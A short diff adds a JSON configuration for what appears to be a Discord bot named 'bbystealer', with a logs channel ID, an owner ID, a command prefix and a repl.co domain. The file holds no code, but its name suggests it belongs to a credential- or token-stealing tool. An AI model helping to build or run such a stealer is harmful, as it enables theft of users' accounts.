@@ -1,0 +1,12 @@
+{
+    "bot": {
+        "token": "process.env.TOKEN",
+        "logs": "1067782436148215831",
+        "prefix": "$",
+        "owner": [
+            "527103747248095234"
+        ]
+    },
+    "domain": "https://1.ilycats.repl.co",
+    "name": "bbystealer"
+}
